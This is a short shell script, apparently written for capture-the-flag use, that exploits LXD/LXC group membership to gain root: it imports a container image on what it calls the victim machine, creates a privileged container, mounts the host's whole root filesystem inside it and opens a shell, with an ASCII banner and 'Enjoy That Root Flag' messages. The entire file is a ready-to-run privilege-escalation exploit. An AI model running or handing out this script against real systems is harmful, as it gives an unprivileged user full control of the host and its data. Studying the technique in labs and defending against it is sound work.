#!/bin/sh

# adding a new container image on victim machine
lxc image import ./"$1"  --alias PrivEsc

# Just Flexing :)
printf "
_________        ___.                     ____.             __   .__        
\_   ___ \___.__.\_ |__   ___________    |    |__ __  ____ |  | _|__| ____  
/    \  \<   |  | | __ \_/ __ \_  __ \   |    |  |  \/    \|  |/ /  |/ __ \ 
\     \___\___  | | \_\ \  ___/|  | \/\__|    |  |  /   |  \    <|  \  ___/ 
 \______  / ____| |___  /\___  >__|  \________|____/|___|  /__|_ \__|\___  >
        \/\/          \/     \/                          \/     \/       \/ 

\n\n
"
sleep 3

# loading a container from our image and giving it full access
lxc init PrivEsc ROOT -c security.privileged=true

# mounting the victim entire filesystem to our container
lxc config device add ROOT mydevice disk source=/ path=/mnt/root recursive=true
echo "-----Your Root Shell is being Generated-----"
sleep 3
echo "**Enjoy That Root Flag**"
sleep 2
# Initiating our container
lxc start ROOT
echo "cd /mnt/root to access the filesystem"
# executing shell from our container
lxc exec ROOT /bin/sh 

